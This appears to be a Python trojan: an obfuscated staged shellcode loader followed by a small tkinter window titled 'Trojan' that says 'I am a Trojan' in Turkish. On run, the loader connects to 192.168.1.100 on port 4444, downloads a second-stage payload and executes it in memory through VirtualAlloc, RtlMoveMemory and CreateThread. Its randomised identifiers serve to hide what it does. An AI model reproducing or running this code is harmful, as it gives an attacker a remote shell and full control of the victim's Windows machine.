import struct, socket, binascii, ctypes as TupkOwYloFl, random, time
lsYbpZkBoqTERp, loeauimScMKcJJ = None, None
def SuYTTHGwRjdb():
	try:
		global loeauimScMKcJJ
		loeauimScMKcJJ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		loeauimScMKcJJ.connect(('192.168.1.100', 4444))
		uYPtIduPuyoo = struct.pack('<i', loeauimScMKcJJ.fileno())
		l = struct.unpack('<i', loeauimScMKcJJ.recv(4))[0]
		XHEcIwcopJiMXXs = b"     "
		while len(XHEcIwcopJiMXXs) < l: XHEcIwcopJiMXXs += loeauimScMKcJJ.recv(l)
		GrsFEVfiGQiWHdB = TupkOwYloFl.create_string_buffer(XHEcIwcopJiMXXs, len(XHEcIwcopJiMXXs))
		GrsFEVfiGQiWHdB[0] = binascii.unhexlify('BF')
		for i in range(4): GrsFEVfiGQiWHdB[i+1] = uYPtIduPuyoo[i]
		return GrsFEVfiGQiWHdB
	except: return None
def oHvANIg(ibQyAxxHdUYEv):
	if ibQyAxxHdUYEv != None:
		RCjcGkqRs = bytearray(ibQyAxxHdUYEv)
		kPldZUwUIDLONF = TupkOwYloFl.windll.kernel32.VirtualAlloc(TupkOwYloFl.c_int(0),TupkOwYloFl.c_int(len(RCjcGkqRs)),TupkOwYloFl.c_int(0x3000),TupkOwYloFl.c_int(0x40))
		EEwSnit = (TupkOwYloFl.c_char * len(RCjcGkqRs)).from_buffer(RCjcGkqRs)
		TupkOwYloFl.windll.kernel32.RtlMoveMemory(TupkOwYloFl.c_int(kPldZUwUIDLONF), EEwSnit, TupkOwYloFl.c_int(len(RCjcGkqRs)))
		ht = TupkOwYloFl.windll.kernel32.CreateThread(TupkOwYloFl.c_int(0),TupkOwYloFl.c_int(0),TupkOwYloFl.c_int(kPldZUwUIDLONF),TupkOwYloFl.c_int(0),TupkOwYloFl.c_int(0),TupkOwYloFl.pointer(TupkOwYloFl.c_int(0)))
		TupkOwYloFl.windll.kernel32.WaitForSingleObject(TupkOwYloFl.c_int(ht),TupkOwYloFl.c_int(-1))
lsYbpZkBoqTERp = SuYTTHGwRjdb()
oHvANIg(lsYbpZkBoqTERp)

import tkinter as tk

pencere = tk.Tk()
pencere.title("Trojan")
pencere.geometry("300x100")
etiket = tk.Label(pencere, text="Ben Bir Trojanım")
etiket.pack(pady=20)
pencere.mainloop()
